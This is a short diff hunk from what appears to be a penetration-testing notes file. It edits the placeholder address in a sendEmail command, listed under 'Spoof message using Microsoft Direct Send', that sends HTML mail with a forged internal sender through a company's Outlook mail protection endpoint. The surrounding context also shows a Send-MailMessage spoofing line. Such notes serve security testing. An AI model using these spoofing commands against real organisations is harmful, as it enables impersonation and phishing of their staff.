@@ -15,7 +15,7 @@ Send-MailMessage -SmtpServer <company-com>.mail.protection.outlook.com -To <user
 
 ### Spoof message using Microsoft Direct Send 
 ```
-cat <file.html> | sendEmail -f "<user>@<company-com>" -u "<subject>" -s "<company-com>.mail.protection.outlook.com" -t "<user>@<company-com>" -o message-content-type=html
+cat <file.html> | sendEmail -f "<user>@<company.com>" -u "<subject>" -s "<company-com>.mail.protection.outlook.com" -t "<user>@<company-com>" -o message-content-type=html
 ```
 
 ### Note
